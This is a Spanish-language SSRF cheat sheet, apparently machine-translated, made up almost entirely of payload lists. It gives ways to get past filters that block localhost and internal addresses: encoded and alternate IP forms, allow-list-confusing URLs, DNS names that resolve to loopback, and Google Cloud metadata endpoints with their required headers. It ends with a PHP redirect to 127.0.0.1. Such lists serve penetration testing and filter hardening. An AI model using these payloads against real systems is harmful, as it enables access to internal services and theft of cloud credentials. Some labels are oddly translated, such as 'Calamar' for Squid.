 # CheatSheet-SSRF

### Host local de derivación básica 

```
# # servidor local 
 http://127.0.0.1:80 
 http://127.0.0.1:443 
 http://127.0.0.1:22 
 http://127.1:80 
 http://0 
 http://0.0.0.0:80 
 http://localhost:80 
 http://[::]:80/ 
 http://[::]:25/SMTP 
 http://[::]:3128/ Calamar 
 http://[0000::1]:80/ 
 http://[0:0:0:0:0:ffff:127.0.0.1]/elarchivo 
 http://①②⑦.⓪.⓪.⓪ 

 # # Omisión de CDIR 
 http://127.127.127.127 
 http://127.0.1.3 
 http://127.0.0.0 

 # # Omisión de decimales 
 http://2130706433/ = http://127.0.0.1 
 http://017700000001 = http://127.0.0.1 
 http://3232235521/ = http://192.168.0.1 
 http://3232235777/ = http://192.168.1.1 

 # # Omisión hexadecimal 
 127.0.0.1 = 0x7f 00 00 01 
 http://0x7f000001/ = http://127.0.0.1 
 http://0xc0a80014/ = http://192.168.0.20 

 # # Omisión de dominio FUZZ (de https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt) 
 http://{dominio}@127.0.0.1 
 http://127.0.0.1#{dominio} 
 http://{dominio}.127.0.0.1 
 http://127.0.0.1/{dominio} 
 http://127.0.0.1/ ? d={dominio} 
 https://{dominio}@127.0.0.1 
 https://127.0.0.1#{dominio} 
 https://{dominio}.127.0.0.1 
 https://127.0.0.1/{dominio} 
 https://127.0.0.1/ ? d={dominio} 
 http://{dominio}@localhost 
 http://localhost#{dominio} 
 http://{dominio}.localhost 
 http://localhost/{dominio} 
 http://localhost/ ? d={dominio} 
 http://127.0.0.1%00{dominio} 
 http://127.0.0.1 ? {dominio} 
 http://127.0.0.1///{dominio} 
 https://127.0.0.1%00{dominio} 
 https://127.0.0.1 ? {dominio} 
 https://127.0.0.1///{dominio} 
```



### Omitir usando DNS -> localhost 

```
localtest.me = 127.0.0.1
 cliente1.aplicación.localhost.mi.empresa.127.0.0.1.nip.io = 127.0.0.1
 correo.ebc.apple.com = 127.0.0.6 (host local)
 127.0.0.1.nip.io = 127.0.0.1 (resuelve a la IP dada)
 www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resuelve a www.google.com
 http://cliente1.aplicación.localhost.mi.empresa.127.0.0.1.nip.io
 http://bugbounty.dod.network = 127.0.0.2 (host local)
 1ynrnhl.xip.io == 169.254.169.254
 spoofed.burpcollaborator.net = 127.0.0.1 
```

### URL de SSRF para Google Cloud 

Requiere el encabezado "Metadata-Flavor: Google" o "X-Google-Metadata-Request: True" 

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

**SSRF Bypasses**

```
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://////////////site.com/
http://0000::1:80/
http://000330.0000072.0000326.00000343
http://000NaN.000NaN
http://0177.00.00.01
http://017700000001
http://0330.072.0326.0343
http://033016553343
http://0NaN
http://0NaN.0NaN
http://0x0NaN0NaN
http://0x7f000001/
http://0xd8.0x3a.0xd6.0xe3
http://0xd8.0x3a.0xd6e3
http://0xd8.0x3ad6e3
http://0xd83ad6e3
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://0xNaN.0xNaN
http://127.0.0.1/status/
http://127.1/
http://2130706433/
http://216.0x3a.00000000326.0xe3
http://3627734755
http://[::]:80/
http://localhost:8000/status/
http://NaN
http://safesite.com#.site.com
http://safesite.com&site.com
http://safesite.com?.site.com
http://safesite.com\.site.com/domain
http://shmilon.0xNaN.undefined.undefined
http://site.com/account/edit.aspx
http://site.com/domain.php
http://site@com/account/edit.aspx
http://whitelisted@127.0.0.1
https://192.10.10.2#.192.10.10.3/
https://192.10.10.2?.192.10.10.3/
https://192.10.10.2\.192.10.10.3/
https://192.10.10.3/
https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
<?php
header('Location: http://127.0.0.1:8080/status');
?>

# Tool
# https://h.43z.one/ipconverter/
```

